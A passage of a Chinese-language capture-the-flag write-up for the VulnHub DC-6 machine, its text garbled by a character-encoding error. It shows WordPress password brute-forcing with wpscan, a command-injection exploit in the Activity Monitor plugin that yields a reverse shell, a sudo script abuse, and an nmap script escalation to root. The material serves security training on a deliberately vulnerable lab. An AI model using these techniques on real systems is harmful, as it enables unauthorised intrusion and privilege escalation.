<p>å“ªåœ¨å“ªé‡Œç™»å½•å‘¢ï¼Ÿæˆ‘ä»¬åœ¨å¼€å§‹é¡µé¢å¹¶æ²¡æœ‰çœ‹åˆ°ç™»å½•çª—å£</p>
<p>æˆ‘ä»¬ç”¨<code>dirb</code>æ‰«ä¸€ä¸‹</p>
<figure class="highlight 1c"><table><tr><td class="code"><pre><span class="line">dirb http:<span class="comment">//wordy</span></span><br></pre></td></tr></table></figure>

<p><img src="/post/vulnhub/image-20221009231112282.png" alt="image-20221009231112282"></p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">http:<span class="regexp">//</span>wordy<span class="regexp">/wp-admin/</span></span><br></pre></td></tr></table></figure>

<p><img src="/post/vulnhub/image-20221009231340911.png" alt="image-20221009231340911"></p>
<hr>
<h2 id="2-wpscançˆ†ç ´å¯†ç "><a href="#2-wpscançˆ†ç ´å¯†ç " class="headerlink" title="2.wpscançˆ†ç ´å¯†ç "></a>2.wpscançˆ†ç ´å¯†ç </h2><p>æˆ‘ä»¬å†æ‰¾ä¸€ä¸ªå¯†ç è¡¨ï¼Œè¿™é‡Œç”¨å’Œ<code>DC2</code> <code>cewl</code>å‘½ä»¤çˆ¬ä¸€ä¸‹ç½‘ç«™ï¼Œçœ‹çœ‹èƒ½ä¸èƒ½åˆ©ç”¨å…¶ä¸­æœ‰æ²¡æœ‰å¯†ç </p>
<figure class="highlight fortran"><table><tr><td class="code"><pre><span class="line">cewl wordy &gt; <span class="keyword">pass</span>.txt  </span><br></pre></td></tr></table></figure>

<p>ç„¶åå°±å¾—åˆ°ä¸€ä¸ªå¯†ç ã€æ“¦ï¼Œéš¾é“å’Œ<code>dc2</code>ä¸€æ ·çš„ã€‘</p>
<p>ç„¶åæˆ‘ä»¬å¼€å§‹è¿›è¡Œçˆ†ç ´ç™»å½•ã€æ³¨æ„éœ€è¦<code>root</code>æƒé™ã€‘</p>
<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">wpscan <span class="attr">--url</span> wordy <span class="attr">--usernames</span> user<span class="selector-class">.txt</span> <span class="attr">--passwords</span> pass<span class="selector-class">.txt</span>                             </span><br></pre></td></tr></table></figure>

<p><img src="/post/vulnhub/image-20221009231928764.png" alt="image-20221009231928764"></p>
<p>ç»“æœè‚¯å®šæ˜¯ä¸è¡Œçš„ã€è‚¯å®šä¸å’Œ<code>DC2</code>ä¸€æ ·ã€‘</p>
<p>&#x3D;&#x3D;&gt;</p>
<p>æ‰€ä»¥è¿™é‡Œæˆ‘ä»¬éœ€è¦æ‰¾ä¸€ä¸ª<strong>å®Œæ•´çš„å¯†ç å­—å…¸</strong></p>
<blockquote>
<p>éœ€è¦ç”¨åˆ°<code>wordpress</code>çš„å¯†ç å­—å…¸ï¼Œkaliè‡ªå¸¦<code>rockyou.txt</code></p>
</blockquote>
<p>ç”±ä½œè€…æç¤ºå¾—ã€ä¹Ÿå°±æ˜¯æŠŠå¯†ç ä¸€éƒ¨åˆ†å‘Šè¯‰ä½ äº†ã€‘</p>
<p><img src="/post/vulnhub/image-20221113171203270.png" alt="image-20221113171203270"></p>
<blockquote>
<p><code>wpscan --url http://wordy --usernames user.txt --passwords /usr/share/wordlists/rockyou.txt|grep k01 -t 5</code></p>
<p>&#x2F;&#x2F;-tæ˜¯æ·»åŠ çº¿ç¨‹æ•°ï¼Œé»˜è®¤æ˜¯5ï¼Œå¤šåŠ å‡ ä¸ªå¯ä»¥æ›´å¿«ä¸€äº›</p>
</blockquote>
<p>å¦‚æœç›´æ¥è·‘çš„æœ‰ç‚¹ä¹…äº†</p>
<p><code>ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€ç¡äº†ä¸€æ™šä¸Šï¼Œä¸çŸ¥é“å¥½ä¹…è·‘å‡ºæ¥çš„ã€‘</code></p>
<p><code>ã€ä¸ƒåƒä¸‡å¯†ç ã€‘</code></p>
<p><img src="/post/vulnhub/image-20221010225451565.png" alt="image-20221010225451565"></p>
<p>æœ€åå¾—åˆ°</p>
<p><img src="/post/vulnhub/image-20221010230354224.png" alt="image-20221010230354224"></p>
<blockquote>
<p>username:<code>mark</code><br>password:<code>helpdesk01</code></p>
</blockquote>
<p>è™½ç„¶åªæœ‰ä¸€ä¸ªç”¨æˆ·ä½†æ˜¯å¤Ÿäº†</p>
<hr>
<h2 id="3-ç™»å½•ç½‘ç«™æ‰¾ä¿¡æ¯"><a href="#3-ç™»å½•ç½‘ç«™æ‰¾ä¿¡æ¯" class="headerlink" title="3.ç™»å½•ç½‘ç«™æ‰¾ä¿¡æ¯"></a>3.ç™»å½•ç½‘ç«™æ‰¾ä¿¡æ¯</h2><p>ç™»å½•åå‘ç°æ˜¯ä¸€ä¸ª<code>wordpress</code>çš„åå°ç½‘ç«™</p>
<p><img src="/post/vulnhub/image-20221010231254865.png" alt="image-20221010231254865"></p>
<p>åœ¨å·¦ä¾§æˆ‘ä»¬å‘ç°äº†ä¸€ä¸ªæ–°çš„ä¸œè¥¿å«åš</p>
<p><code>Activity monitor</code></p>
<blockquote>
<p>æ˜¯ä¸€æ¬¾ç½‘ç«™ç”¨æˆ·æ´»åŠ¨ç›‘æ§æ’ä»¶ï¼Œæˆ‘ä»¬ç”¨æˆ·ç™»å½•çš„ipå’Œå…¶ä»–ä¿¡æ¯éƒ½ä¼šè¢«ç›‘æ§</p>
<p>&#x2F;&#x2F;é‚£ä¹ˆæˆ‘ä»¬æ˜¯ä¸æ˜¯å¯ä»¥è¯•è¯•æ‰¾æ‰¾è¿™ä¸ªæ’ä»¶æœ‰æ²¡æœ‰æ¼æ´ï¼Œä»è€Œé€šè¿‡è¿™ä¸ªæ¼æ´æ‹¿åˆ°shellæˆ–è€…å…¶ä»–æ›´é«˜æƒé™ç”¨æˆ·çš„ä¿¡æ¯</p>
</blockquote>
<p><img src="/post/vulnhub/image-20221010231223449.png" alt="image-20221010231223449"></p>
<p><img src="/post/vulnhub/image-20221010231622962.png" alt="image-20221010231622962"></p>
<p>æˆ‘ä»¬æŸ¥ä¸€ä¸‹</p>
<figure class="highlight crmsh"><table><tr><td class="code"><pre><span class="line">searchsploit activity <span class="literal">monitor</span></span><br></pre></td></tr></table></figure>

<p><img src="/post/vulnhub/image-20221010231725009.png" alt="image-20221010231725009"></p>
<p>å‘ç°æœç„¶æ˜¯æœ‰çš„ï¼Œåªæ˜¯ä¸çŸ¥é“èƒ½ä¸èƒ½åˆ©ç”¨</p>
<p>æˆ‘ä»¬ä¸»è¦æ‰¾åé¢ä¸¤ä¸ªå’Œ<code>wordpress</code>ç›¸å…³çš„</p>
<blockquote>
<p><code>45274.html</code>æ˜¯å‘½ä»¤æ³¨å…¥<br><code>50110.py</code>æ˜¯è¿œç¨‹å‘½ä»¤æ‰§è¡Œ</p>
</blockquote>
<h3 id="1ï¼‰50110-pyã€æœ‰é—®é¢˜ï¼Œä¸å»ºè®®ç”¨ã€‘"><a href="#1ï¼‰50110-pyã€æœ‰é—®é¢˜ï¼Œä¸å»ºè®®ç”¨ã€‘" class="headerlink" title="1ï¼‰50110.pyã€æœ‰é—®é¢˜ï¼Œä¸å»ºè®®ç”¨ã€‘"></a>1ï¼‰50110.pyã€æœ‰é—®é¢˜ï¼Œä¸å»ºè®®ç”¨ã€‘</h3><p>æ„Ÿè§‰<code>py</code>æ›´æ–¹ä¾¿ä¸€äº›ï¼Œæˆ‘ä»¬å…ˆæŸ¥çœ‹å†…å®¹</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">cat <span class="regexp">/usr/</span>share<span class="regexp">/exploitdb/</span>exploits<span class="regexp">/php/</span>webapps/<span class="number">50110</span>.py</span><br></pre></td></tr></table></figure>

<p><img src="/post/vulnhub/image-20221010232311464.png" alt="image-20221010232311464"></p>
<p>çœ‹æ¥åªéœ€è¦<code>ip</code>ï¼Œä»¥åŠ<code>ç”¨æˆ·å</code>å’Œ<code>å¯†ç </code>å³å¯è¿›å…¥<code>shell</code></p>
<p>æˆ‘ä»¬è¿è¡Œä¸€ä¸‹</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">python <span class="regexp">/usr/</span>share<span class="regexp">/exploitdb/</span>exploits<span class="regexp">/php/</span>webapps/<span class="number">50110</span>.py</span><br></pre></td></tr></table></figure>



<p>ç„¶åæˆ‘æŒ‰æˆ‘çš„è¾“å…¥</p>
<blockquote>
<p><code>192.168.133.145</code><br><code>mark</code><br><code>helpdesk01</code></p>
</blockquote>
<p><img src="/post/vulnhub/image-20221010232611030.png" alt="image-20221010232611030"></p>
<p>è¿›å…¥<code>shell</code></p>
<hr>
<p>ç„¶åå›ºå®šå§¿åŠ¿ï¼Œè¿›å…¥äº¤äº’å¼<code>shell</code></p>
<figure class="highlight ada"><table><tr><td class="code"><pre><span class="line">python -c <span class="symbol">&#x27;import</span> pty; pty.spawn(<span class="string">&quot;/bin/bash&quot;</span>)&#x27;</span><br></pre></td></tr></table></figure>

<p>ä½†æ˜¯ä¼šæŠ¥é”™</p>
<p>ä¼¼ä¹ä¸èƒ½ä½¿ç”¨<code>python</code>å‘½ä»¤ï¼Œä¸€ä½¿ç”¨å°±é€€å‡º<code>shell</code></p>
<p><img src="/post/vulnhub/image-20221010233037169.png" alt="image-20221010233037169"></p>
<p>é‚£å°±çœ‹èµ·æ¥æœ‰ç‚¹éš¾å—äº†ï¼Œå†è¯•è¯•èƒ½ä¸èƒ½è¿›å…¥ç¨³å®š<code>shell</code></p>
<blockquote>
<p>å…ˆ<br><code>ctrl+z</code><br>ç„¶åæ‰§è¡Œ<br><code>stty raw -echo ; fg ; reset</code>  </p>
</blockquote>
<p>ç»“æœå¡æ­»äº†</p>
<p>ç®—äº†ç®—äº†ï¼Œå°±è¿™æ ·çœ‹å§</p>
<p>ã€æˆ‘è¿™é‡ŒæŠŠ<code>py</code>è„šæœ¬å¯¼å…¥ä¸€ä¸ªæ–°çš„æ–‡ä»¶é‡Œï¼ˆ<code>1.py</code>ï¼‰ï¼ŒæŠŠæˆ‘çš„ipï¼Œç”¨æˆ·åï¼Œå¯†ç éƒ½å†™äº†è¿›å»ï¼Œå°±ä¸ç”¨é€€å‡ºäº†åˆé‡æ–°è¾“å…¥äº†ã€‘</p>
<hr>
<p>å…ˆé€€åˆ°ä¸»ç›®å½•çœ‹çœ‹æœ‰å‡ ä¸ªç”¨æˆ·</p>
<p>ä½†æ˜¯å‘ç°å¥½åƒæœ‰ç‚¹é—®é¢˜ï¼Œä¼¼ä¹æœ‰çš„å‘½ä»¤æ‰§è¡Œå°±å’Œè„šæœ¬å†²çªï¼Œé‚£å°±ç”¨</p>
<p><img src="/post/vulnhub/image-20221010234544191.png" alt="image-20221010234544191"></p>
<h3 id="2ï¼‰45274-html"><a href="#2ï¼‰45274-html" class="headerlink" title="2ï¼‰45274.html"></a>2ï¼‰45274.html</h3><p>é‚£æˆ‘ä»¬å…ˆä¸ç®¡å®ƒï¼Œæˆ‘ä»¬è¿˜æœ‰ä¸€ä¸ªå‘½ä»¤æ³¨å…¥çš„æ²¡æœ‰ç”¨ï¼Œ</p>
<p>æˆ‘ä»¬å…ˆæŸ¥çœ‹ä¸€ä¸‹å†…å®¹</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">cat <span class="regexp">/usr/</span>share<span class="regexp">/exploitdb/</span>exploits<span class="regexp">/php/</span>webapps/<span class="number">45274</span>.html</span><br></pre></td></tr></table></figure>

<p><img src="/post/vulnhub/image-20221011113959660.png" alt="image-20221011113959660"></p>
<p>æˆ‘ä»¬æŠŠè¿™ä¸ªæ–‡ä»¶å¯¼å…¥ä¸€ä¸ªæ–°æ–‡ä»¶ä¸­ã€1.htmlã€‘</p>
<p>ä¸»è¦æ˜¯ä¿®æ”¹è¿™é‡Œçš„ç½‘ç«™ç½‘å€å’Œç›‘å¬æœ¬åœ°<code>ip</code>ï¼Œæ”¹æˆæˆ‘ä»¬çš„<code>wordy</code>å’Œ<code>kali</code>æœºçš„<code>ip</code></p>
<figure class="highlight nsis"><table><tr><td class="code"><pre><span class="line">http://localhost:<span class="number">8000</span>/wp-<span class="literal">admin</span>/<span class="literal">admin</span>.php?<span class="keyword">page</span>=plainview_activity_monitor&amp;tab=activity_tools</span><br><span class="line"></span><br><span class="line">==&gt;</span><br><span class="line"></span><br><span class="line">http://wordy/wp-<span class="literal">admin</span>/<span class="literal">admin</span>.php?<span class="keyword">page</span>=plainview_activity_monitor&amp;tab=activity_tools</span><br></pre></td></tr></table></figure>

<p><img src="/post/vulnhub/image-20221011115438911.png" alt="image-20221011115438911"></p>
<figure class="highlight abnf"><table><tr><td class="code"><pre><span class="line">nc -nlvp <span class="number">127.0</span>.<span class="number">0.1</span>   <span class="operator">=</span><span class="operator">=</span>&gt;   nc <span class="number">192.168</span>.<span class="number">133.140</span></span><br></pre></td></tr></table></figure>

<p><img src="/post/vulnhub/image-20221011114105820.png" alt="image-20221011114105820"></p>
<p>ç„¶åå› ä¸ºæ˜¯<code>html</code>æ–‡ä»¶ï¼Œæˆ‘ä»¬å¯ä»¥ç›´æ¥ç”¨æµè§ˆå™¨æ‰“å¼€ï¼Œ</p>
<p><img src="/post/vulnhub/image-20221011114637014.png" alt="image-20221011114637014"></p>
<p>å½“ç„¶ä¹Ÿå¯ä»¥</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">python</span> -m http.server <span class="number">8008</span></span><br></pre></td></tr></table></figure>

<p>ç„¶åä»¥æµè§ˆå™¨æ–¹å¼è®¿é—®æœ¬åœ°<code>ip:8008</code>ï¼Œå†æ‰“å¼€é‡Œé¢<code>1.html</code>æ–‡ä»¶</p>
<p><img src="/post/vulnhub/image-20221011114825111.png" alt="image-20221011114825111"></p>
<h4 id="ncç›‘å¬æ‹¿shell"><a href="#ncç›‘å¬æ‹¿shell" class="headerlink" title="ncç›‘å¬æ‹¿shell"></a>ncç›‘å¬æ‹¿shell</h4><p>ç„¶åæˆ‘ä»¬å‘ç°æœ‰ä¸ª</p>
<p><code>Submit request</code>çš„æŒ‰é’®ï¼Œçœ‹æ¥æ˜¯å‘é€è¯·æ±‚ï¼Œç„¶å<code>nc</code>åå¼¹shell</p>
<blockquote>
<p>æ³¨æ„ç›‘å¬ç«¯å£æ˜¯<code>9999</code></p>
</blockquote>
<p><img src="/post/vulnhub/image-20221011115108761.png" alt="image-20221011115108761"></p>
<p>ç„¶åæˆ‘ä»¬åœ¨æµè§ˆå™¨ç‚¹å‡»ä¸€ä¸‹<code>Submit request</code></p>
<p><img src="/post/vulnhub/image-20221011122029894.png" alt="image-20221011122029894"></p>
<p>è¿æ¥åˆ° <code>shell</code></p>
<p>è¿™ä¸ªæ¯”è„šæœ¬çš„é‚£ä¸ªå°±æ›´åŠ æ–¹ä¾¿ä¸€ä¸‹äº†ï¼Œ</p>
<hr>
<p>å›ºå®šå§¿åŠ¿</p>
<figure class="highlight ada"><table><tr><td class="code"><pre><span class="line">python -c <span class="symbol">&#x27;import</span> pty; pty.spawn(<span class="string">&quot;/bin/bash&quot;</span>)&#x27;</span><br></pre></td></tr></table></figure>

<p>ç„¶åè¿›å…¥ç¨³å®šå¼shell</p>
<blockquote>
<p>å…ˆ<code>ctrl+z</code><br>ç„¶åæ‰§è¡Œ<br><code>stty raw -echo ; fg ; reset</code> Â </p>
</blockquote>
<p><img src="/post/vulnhub/image-20221011122301709.png" alt="image-20221011122301709"></p>
<hr>
<p>ç„¶åå¼€å§‹æ‰¾æ‰¾æœ‰æ²¡æœ‰å…¶ä»–ç”¨æˆ·çš„å¯†ç ä¿¡æ¯</p>
<p>å…ˆåˆ° <code>/home</code> é‡ŒæŸ¥çœ‹ä¸€ä¸‹ï¼Œå‘ç°äº†é™¤äº†<code>admin</code>å…¶ä»–ä¸‰ä¸ªç”¨æˆ·ç›®å½•</p>
<p><img src="/post/vulnhub/image-20221011122438174.png" alt="image-20221011122438174"></p>
<p>æˆ‘ä»¬å…ˆè¿›æˆ‘ä»¬ç™»å½•æˆåŠŸçš„<code>mark</code>ç›®å½•æŸ¥çœ‹</p>
<p><img src="/post/vulnhub/image-20221011122638708.png" alt="image-20221011122638708"></p>
<p>å‘ç°æœ‰ä¸ª<code>things-to-do.txt</code>æ–‡æœ¬æ–‡ä»¶</p>
<p>æŸ¥çœ‹å†…å®¹</p>
<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line"><span class="keyword">cat</span> things-<span class="keyword">to</span>-<span class="keyword">do</span>.txt</span><br></pre></td></tr></table></figure>

<p><img src="/post/vulnhub/image-20221011122741660.png" alt="image-20221011122741660"></p>
<blockquote>
<p><code>Things to do:</code></p>
<ul>
<li><code>Restore full functionality for the hyperdrive (need to speak to Jens)</code></li>
<li><code>Buy present for Sarah&#39;s farewell party</code></li>
<li><code>Add new user: graham - GSo7isUM1D4 - done</code></li>
<li><code>Apply for the OSCP course</code></li>
<li><code>Buy new laptop for Sarah&#39;s replacement</code></li>
</ul>
<p>æ„æ€æ˜¯ï¼š</p>
<p>è¦åšçš„äº‹æƒ…ï¼š</p>
<ul>
<li>æ¢å¤è¶…å…‰é€Ÿå¼•æ“çš„å…¨éƒ¨åŠŸèƒ½ï¼ˆéœ€è¦ä¸ Jens äº¤è°ˆï¼‰</li>
<li>ä¸ºèæ‹‰çš„å‘Šåˆ«æ´¾å¯¹è´­ä¹°ç¤¼ç‰©</li>
<li>æ·»åŠ æ–°ç”¨æˆ·ï¼šgraham - GSo7isUM1D4 - å®Œæˆ</li>
<li>ç”³è¯·OSCPè¯¾ç¨‹</li>
<li>ä¸ºèæ‹‰è´­ä¹°æ–°çš„ç¬”è®°æœ¬ç”µè„‘</li>
</ul>
<p>&#x2F;&#x2F;å…³é”®ä¿¡æ¯æˆ‘ä»¬å¾—åˆ°äº†grahamç”¨æˆ·çš„å¯†ç ã€æˆ‘ä¹Ÿæƒ³è€ƒOSCPï¼Œå“­å”§å”§ã€‘</p>
</blockquote>
<p>æˆ‘ä»¬æ ¹æ®æˆ‘ä»¬æ‹¿åˆ°<code>graham</code>çš„ä¿¡æ¯ï¼Œç™»å½•<code>ssh</code></p>
<p>ã€å½“ç„¶åœ¨åŸæœ‰<code>shell</code>é‡Œåˆ©ç”¨<code>su</code>å‘½ä»¤åˆ‡æ¢ç”¨æˆ·<code>graham</code>ä¹Ÿæ˜¯å¯ä»¥çš„ï¼Œä½†æ˜¯<code>ssh</code>æœ‰é¢œè‰²ï¼Œçœ‹èµ·æ¥å¥½çœ‹ä¸€äº›ã€‘</p>
<p>ã€å› ä¸ºä¹‹å‰å°±çœ‹åˆ°è¿è¡Œç€<code>ssh</code>ï¼Œæ²¡å¿…è¦å†åœ¨ç™»å½•ä¸€æ¬¡ç½‘ç«™ï¼Œåæ­£ä¸æ˜¯æœ€é«˜æƒé™ã€‘</p>
<blockquote>
<p><code>ssh graham@192.168.133.145 -p 22</code>    &#x2F;&#x2F;é¶æœºip  sshè¿è¡Œç«¯å£<br>å¯†ç ï¼š<code>GSo7isUM1D4</code></p>
</blockquote>
<p><img src="/post/vulnhub/image-20221011123625279.png" alt="image-20221011123625279"></p>
<p>ç„¶åæˆ‘ä»¬çœ‹çœ‹æˆ‘ä»¬æœ‰å“ªäº›å‘½ä»¤å¯ä»¥æ‰§è¡Œ</p>
<figure class="highlight ebnf"><table><tr><td class="code"><pre><span class="line"><span class="attribute">sudo -l</span></span><br></pre></td></tr></table></figure>

<p><img src="/post/vulnhub/image-20221011124153885.png" alt="image-20221011124153885"></p>
<p>çœ‹åˆ°æ˜¯æœ‰<code>jens</code>ç›®å½•ä¸‹ä¸€ä¸ªè„šæœ¬æ–‡ä»¶çš„è¿è¡Œæƒé™ï¼Œè€Œä¸”ä¸éœ€è¦<code>jens</code>çš„å¯†ç ï¼Œå°±å¯ä»¥ä»–çš„èº«ä»½ä¸‹è¿è¡Œäº†ã€<code>mark</code>æˆ‘è¯•äº†çš„ï¼Œæ²¡æœ‰æƒé™ã€‘</p>
<h4 id="ä»¥å…¶ä»–ç”¨æˆ·èº«ä»½è¿è¡Œè„šæœ¬ï¼Œå®ç°åˆ‡æ¢ç”¨æˆ·"><a href="#ä»¥å…¶ä»–ç”¨æˆ·èº«ä»½è¿è¡Œè„šæœ¬ï¼Œå®ç°åˆ‡æ¢ç”¨æˆ·" class="headerlink" title="ä»¥å…¶ä»–ç”¨æˆ·èº«ä»½è¿è¡Œè„šæœ¬ï¼Œå®ç°åˆ‡æ¢ç”¨æˆ·"></a>ä»¥å…¶ä»–ç”¨æˆ·èº«ä»½è¿è¡Œè„šæœ¬ï¼Œå®ç°åˆ‡æ¢ç”¨æˆ·</h4><p>æˆ‘ä»¬å…ˆæŸ¥çœ‹ä¸€ä¸‹å†…å®¹</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> /home/jens/backups.sh</span><br></pre></td></tr></table></figure>

<p><img src="/post/vulnhub/image-20221011124824445.png" alt="image-20221011124824445"></p>
<p>å‘ç°æ˜¯æ‰§è¡Œä¸€äº›å‘½ä»¤ï¼Œ</p>
<p>ä½†æ˜¯æˆ‘ä»¬çš„ç›®çš„æƒ³è·å¾—<code>jens</code>çš„ç™»å½•æƒé™ï¼Œæˆ‘ä»¬åœ¨è„šæœ¬æ–‡ä»¶ä¸­è¿½åŠ ä¸€äº›å‘½ä»¤</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;/bin/bash&quot;</span>  &gt;&gt; /home/jens/backups.sh</span><br></pre></td></tr></table></figure>

<p>è¿™æ ·çš„è¯å½“æˆ‘ä»¬ä»¥<code>jens</code>èº«ä»½è¿è¡Œè¿™ä¸ªè„šæœ¬æ—¶ï¼Œå½“æ‰§è¡Œ<code>/bin/bash</code>æ—¶ï¼Œå°±ç®—æˆ‘ä»¬ç°åœ¨æ˜¯<code>graham</code>ï¼Œä¹Ÿä¼šåˆ‡æ¢æˆ<code>jens</code>ï¼Œè¿™ä¹Ÿå¾—ç›Šäºå¯ä»¥<code>nopasswd</code>è¿è¡Œ</p>
<blockquote>
<p><code>sudo -u jens /home/jens/backups.sh</code></p>
<p>&#x2F;&#x2F;æ³¨æ„å“¦ï¼Œè¿™é‡Œæ˜¯éœ€è¦ä»¥<code>jens</code>èº«ä»½è¿è¡Œã€æ¯•ç«Ÿä»–ç»™äº†æˆ‘ä»¬ç”¨ä»–èº«ä»½æ‰§è¡Œæƒé™ã€‘æ‰å¯ä»¥å®ç°åˆ‡æ¢ç”¨æˆ·ï¼Œå¦‚æœç›´æ¥è¿è¡Œè¿˜æ˜¯<code>graham</code>ç”¨æˆ·ï¼Œå°±å¦‚ä¸‹å›¾ä¸€æ ·</p>
</blockquote>
<p><img src="/post/vulnhub/image-20221011125910796.png" alt="image-20221011125910796"></p>
<p>åˆ‡æ¢ç”¨æˆ·æˆåŠŸï¼Œ</p>
<p>æˆ‘ä»¬å…ˆçœ‹çœ‹<code>jens</code>æœ‰å“ªäº›å‘½ä»¤å¯ä»¥æ‰§è¡Œ</p>
<figure class="highlight ebnf"><table><tr><td class="code"><pre><span class="line"><span class="attribute">sudo -l</span></span><br></pre></td></tr></table></figure>

<p><img src="/post/vulnhub/image-20221011130314044.png" alt="image-20221011130314044"></p>
<p>ç»ˆäºï¼Œå‘ç°äº†<code>root</code>çš„ï¼Œæˆ‘ä»¬å¯ä»¥æ‰§è¡Œ<code>nmap</code>å‘½ä»¤ã€åªæœ‰ç®¡ç†å‘˜å¯ä»¥ã€‘ï¼Œé‚£ä¹ˆå¦‚ä½•æ‹¿åˆ°æƒé™å‘¢</p>
<h2 id="4-nmapææƒ"><a href="#4-nmapææƒ" class="headerlink" title="4.nmapææƒ"></a>4.nmapææƒ</h2><h3 id="1-æ—§ç‰ˆ"><a href="#1-æ—§ç‰ˆ" class="headerlink" title="1.æ—§ç‰ˆ"></a>1.æ—§ç‰ˆ</h3><p>nmapï¼ˆ2.02-5.21ï¼‰å­˜åœ¨äº¤æ¢æ¨¡å¼ï¼Œå¯åˆ©ç”¨ææƒ</p>
<figure class="highlight ada"><table><tr><td class="code"><pre><span class="line">nmap <span class="comment">--interactive</span></span><br></pre></td></tr></table></figure>

<p>ä¹‹åæ‰§è¡Œ:</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">nmap</span>&gt; !sh</span><br><span class="line"><span class="attribute">sh</span>-<span class="number">3</span>.<span class="number">2</span># whoami</span><br><span class="line"><span class="attribute">root</span></span><br></pre></td></tr></table></figure>

<p>msfä¸­çš„æ¨¡å—ä¸ºï¼š</p>
<figure class="highlight applescript"><table><tr><td class="code"><pre><span class="line">exploit/unix/<span class="keyword">local</span>/setuid_nmap</span><br></pre></td></tr></table></figure>

<h3 id="2-æ–°ç‰ˆ"><a href="#2-æ–°ç‰ˆ" class="headerlink" title="2.æ–°ç‰ˆ"></a>2.æ–°ç‰ˆ</h3><p>è¾ƒæ–°ç‰ˆå¯ä½¿ç”¨ <code>--script</code> å‚æ•°ï¼š</p>
<blockquote>
<p>å…ˆå†™å…¥ä¸€æ¡å‘½ä»¤<br><code>echo &quot;os.execute(&#39;/bin/sh&#39;)&quot; &gt; getshell</code><br>å†â€“scriptå‚æ•°ï¼Œæ‰§è¡Œ<br><code>sudo nmap --script=getshell</code></p>
</blockquote>
<p>æŸ¥çœ‹ä¸€ä¸‹é¶æœºçš„<code>nmap</code>ç‰ˆæœ¬</p>
<p><code>7.4</code>è¿˜æ˜¯æŒºé«˜çš„</p>
<p><img src="/post/vulnhub/image-20221011131514173.png" alt="image-20221011131514173"></p>
<p>é‚£æˆ‘ä»¬å†™ä¸€ä¸ªè„šæœ¬ï¼Œé‡Œé¢åŠ ä¸Šå‘½ä»¤ï¼Œå†ç”¨æ–°ç‰ˆ<code>nmap</code>è¿è¡Œè¿™ä¸ªè„šæœ¬</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;os.execute(&#x27;/bin/sh&#x27;)&quot;</span> &gt; getshell</span><br></pre></td></tr></table></figure>



<blockquote>
<p>æ³¨æ„å“ˆï¼Œ<code>jens</code>åªæœ‰åœ¨<code>~</code>ç›®å½•ä¸‹æ‰å¯ä»¥æ‰§è¡Œ<code>echo</code>å‘½ä»¤ï¼Œä¸ç„¶æ˜¯ä¸å¯ä»¥çš„</p>
</blockquote>
<p><img src="/post/vulnhub/image-20221011132114963.png" alt="image-20221011132114963"></p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">sudo nmap <span class="attribute">--script</span>=getshell</span><br></pre></td></tr></table></figure>

<p><img src="/post/vulnhub/image-20221011132315607.png" alt="image-20221011132315607"></p>
<p>æˆåŠŸææƒï¼Œç„¶åæˆ‘ä»¬æŸ¥æ‰¾<code>flag</code>ã€æ²¡è¾“å…¥å›æ˜¾æœ‰ç‚¹å°éš¾å—ï¼Œä½†æ˜¯ä¸å½±å“æ‹¿<code>flag</code>ã€‘</p>
<p><img src="/post/vulnhub/image-20221011132507052.png" alt="image-20221011132507052"></p>
<blockquote>
<figure class="highlight tap"><table><tr><td class="code"><pre><span class="line">Yb        dP<span class="number"> 888888 </span>88    <span class="number"> 88 </span>        8888b.   dP&quot;Yb  88b<span class="number"> 88 </span>888888 d8b </span><br><span class="line"> Yb  db  dP  88__  <span class="number"> 88 </span>   <span class="number"> 88 </span>         8I  Yb dP   Yb 88Yb88 88__   Y8P </span><br><span class="line">  YbdPYbdP   88&quot;&quot;  <span class="number"> 88 </span> .o<span class="number"> 88 </span> .o      8I  dY Yb   dP<span class="number"> 88 </span>Y88 88&quot;&quot;   `&quot;&#x27; </span><br><span class="line">   YP  YP   <span class="number"> 888888 </span>88ood8 88ood8     8888Y&quot;   YbodP <span class="number"> 88 </span> Y8<span class="number"> 888888 </span>(8) </span><br></pre></td></tr></table></figure>

<p><code>Congratulations!!!</code></p>
<p><code>Hope you enjoyed DC-6.  Just wanted to send a big thanks out there to all those</code><br><code>who have provided feedback, and who have taken time to complete these little</code><br><code>challenges.</code></p>
<p><code>If you enjoyed this CTF, send me a tweet via @DCAU7.</code></p>
<p>æ„æ€æ˜¯ï¼š<br>æ­å–œï¼ï¼ï¼</p>
<p>å¸Œæœ›ä½ å–œæ¬¢ DC-6ã€‚åªæ˜¯æƒ³å‘æ‰€æœ‰è¿™äº›äººè¡¨ç¤ºè¡·å¿ƒçš„æ„Ÿè°¢<br>è°æä¾›äº†åé¦ˆï¼Œè°èŠ±æ—¶é—´å®Œæˆäº†è¿™äº›å°äº‹<br>æŒ‘æˆ˜ã€‚</p>
<p>å¦‚æœä½ å–œæ¬¢è¿™ä¸ª CTFï¼Œè¯·é€šè¿‡@DCAU7 ç»™æˆ‘å‘ä¸€æ¡æ¨æ–‡ã€‚</p>
</blockquote>
<p><strong>ä¸€ä¸ªæ——å­æ‰¾å®Œï¼Œæ¸¸æˆç»“æŸ</strong></p>
<hr>
<h1 id="ä¸ƒã€DC-7-ä¸­çº§"><a href="#ä¸ƒã€DC-7-ä¸­çº§" class="headerlink" title="ä¸ƒã€DC-7[ä¸­çº§]"></a>ä¸ƒã€DC-7[ä¸­çº§]</h1><p><strong>only one flag</strong></p>
<blockquote>
<p><code>hintï¼š</code><br><code>While it&#39;s kind of a logical progression from an earlier DC release (I won&#39;t tell you which one), there are some new concepts involved, but you will need to figure those out for yourself. :-) If you need to resort to brute forcing or dictionary attacks, you probably won&#39;t succeed.</code></p>
<p><code>What you will need to do, is to think &quot;outside&quot; of the box.</code></p>
<p><code>Waaaaaay &quot;outside&quot; of the box. :-)</code></p>
